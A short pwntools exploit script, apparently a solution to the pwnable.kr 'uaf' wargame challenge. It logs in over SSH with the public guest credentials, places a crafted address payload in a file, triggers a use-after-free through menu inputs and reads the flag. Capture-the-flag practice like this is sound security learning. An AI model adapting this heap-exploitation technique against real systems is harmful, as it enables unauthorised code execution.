from  pwn import *
import os,random
payload = '\x68\x15\x40\x00\x00\x00\x00\x00'
BYTES = "24"
rand = random.randint(1,10000)
dir_name =  "/tmp/hello{}/".format(rand)
file_name = "file{}".format(rand)
path = dir_name + file_name
args = ["/home/uaf/uaf",BYTES,path]
create_file = "echo -e '{}' > {} ".format(payload,path)

s = ssh(host="pwnable.kr",port=2222,password="guest",user="uaf")
s.run("mkdir -p {}".format(dir_name))
s.run("touch {}".format(path))
print "run this command and press Ctrl+D " + create_file
s.interactive()


p = s.process(argv=args)
p.sendline("3")
p.sendline("2")
p.sendline("2")
p.sendline("1")
p.sendline("cat flag")
p.interactive()


